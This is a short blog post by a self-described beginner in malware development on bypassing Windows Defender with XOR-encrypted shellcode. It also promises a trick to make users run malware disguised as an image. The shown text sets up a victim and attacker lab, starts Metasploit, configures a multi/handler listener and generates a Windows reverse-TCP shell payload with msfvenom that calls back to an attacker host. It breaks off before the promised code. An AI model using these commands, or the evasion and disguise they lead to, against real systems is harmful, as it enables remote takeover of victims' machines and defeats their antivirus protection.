---
title: "Bypass Windows Defender With Xor Encryption"
date: 2024-04-22
---

# Prelude
---

If you're new in malware development, just like me you might've heard that it was possible to bypass windows defender with a simple encryption. 
I could not believe it, so I had to try it and why not put in a blog to describe my experience at the same time!
In this blog I will take you through it step by step. At the end, I will also introduce a clever way of fooling a user into clicking on our malware that will appear as an image.


# Environment Setup
---

If you want also want to perform this simple attack you will need to have to virtual machines
  - Windows Machine (victim)
  - Kali Linux or any other machine with metasploit on it (Attacker)


# Configuring your C2 (Command & Control)
---

Now, I know some of you will say what is a C2 or why am I considering metasploit as C2. Well, let me explain in this case metasploit will act as a command and control center because it will be used to issue commands to the compromised system and also, to receive data from them. Now that the air is cleared let's proceed!

- Start Metasploit Framework
  ```
  sudo service postgresql start && msfconsole -q
  ```
- Configure Listener
  ```
  use multi/handler
  set LHOST <HOST>
  set LPORT <PORT>
  run
  ```
- Generate shellcode
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f c -o <name>.c
  ```


# Coding
---

Now for all my fellow hackers who likes programming, I know your hands are itching right now, but you can finally used them or maybe not since I will provide you with the code already written,
but you can still play around with it if you want to!




